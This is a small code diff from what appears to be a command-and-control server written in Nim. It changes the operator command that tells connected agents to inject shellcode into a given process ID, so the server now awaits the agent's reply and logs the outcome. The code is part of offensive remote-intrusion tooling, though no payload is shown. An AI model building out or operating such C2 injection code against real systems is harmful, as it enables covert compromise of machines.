@@ -5,7 +5,7 @@ import std/[
 
 import system/io, json
 
-import ../../types, ../../logging, ../../communication
+import ../../types, ../../logging, ../../communication, ../../tasks
 
 proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
   if args.len < 2:
@@ -17,7 +17,12 @@ proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: T
     for client in server.cli.handlingClient:
       let task = await client.sendClientTask("inject_shellcode", %*[ args[0], shellcode ])
       if not task.isNil(): 
-        server.cli.waitingForOutput = true
+        await task.awaitResponse()
+        if not task.isError():
+          successLog "injected " & $shellcode.len & " -> " & " PID " & args[0]
+        else:
+          errorLog "error from agent: " & task.output.error
+
   except IOError:
     errorLog "Couldn't open file. Does it exist?"
 
